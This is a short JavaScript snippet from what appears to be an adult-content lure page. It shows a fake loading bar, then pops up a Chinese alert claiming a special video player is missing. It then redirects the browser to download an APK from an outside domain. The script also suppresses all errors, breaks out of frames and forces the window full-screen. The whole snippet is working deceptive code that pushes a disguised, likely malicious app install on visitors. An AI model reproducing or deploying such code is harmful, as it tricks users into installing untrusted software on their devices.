		var bar=0 
		var line="||" 
		var amount="|" 
		count()
		function count()
		{ 
			isLoading.style.display	="none";		//隐藏层 [加载进度]		
			isAlert.style.display	="none";		//隐藏层 [提示下载]	
			isMsg.style.display		="none";		//隐藏层 [提示成功]		
			
			bar=bar+2 
			amount =amount + line 
			document.loading.chart.value=amount 
			document.loading.percent.value=bar+"%" 
			if (bar<99) 
			{
			
				isLoading.style.display	="block";	//显示层 [加载进度]
				setTimeout("count()",15);
			} 
			else 
			{
				window.alert('没有检测到本站专用色片播放器,请下载本站专用播放器，安装后运行专用浏览器即可观看本站2W部成人爽片哦！');
				location.href="http://d.haoghost.com/360sqyy.apk";
				isLoading.style.display	="none";	//隐藏层 [加载进度]
				isAlert.style.display	="block";	//显示层 [提示下载]


			} 

		}

if(self!=top)
{
window.open(self.location,'_top');
}
function killErrors()
{
return true;
}
window.onerror = killErrors;
self.moveTo(0,0);
self.resizeTo(screen.availWidth,screen.availHeight); 
